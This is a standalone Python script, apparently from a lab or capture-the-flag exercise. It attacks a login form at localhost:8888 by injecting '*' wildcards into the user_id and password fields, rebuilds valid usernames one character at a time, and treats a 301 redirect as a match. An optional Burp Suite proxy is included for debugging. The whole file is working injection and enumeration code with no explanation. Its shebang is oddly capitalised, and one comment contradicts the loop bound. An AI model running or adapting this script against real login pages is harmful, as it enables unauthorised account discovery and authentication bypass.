#!/USR/BIn/python3
import requests
import time
import signal
import sys
import string
import pdb

# function to manage CTRL+c
def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# function to find out valid users by using brute force
def get_valid_users():
    # headers needed to sent POST data
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    # valid users acumulator
    valid_users = []
    # main bucle that will find out valid users
    for character_i in string.ascii_lowercase:
        # user acumulator
        valid_user = character_i
        # bucle to find out the entire username (max username size: 20)
        for index in range (0, 15):
            for character_j in '\0' + string.ascii_lowercase:
                # data to be sent
                post_data = 'user_id={}{}*&password=*&login=1&submit=Submit'.format(valid_user, character_j)

                # use BurpSuite to debug the requests sent
                #r = requests.post(target_url, headers=headers, data=post_data, allow_redirects=False, proxies=burp)
                r = requests.post(target_url, headers=headers, data=post_data, allow_redirects=False)

                # validate character matched by validating the status code 301 (redirection)
                if r.status_code == 301:
                    valid_user += character_j
                    break

        valid_users.append(valid_user)

    return [valid_user for valid_user in valid_users if len(valid_user) > 1]

# CTRL+c
signal.signal(signal.SIGINT, def_handler)

# global variables
target_url = "http://localhost:8888/"
burp = {'http': 'http://127.0.0.1:8080'}   # use BurpSuite proxie to manage debugging

if __name__ == "__main__":
    print(get_valid_users())
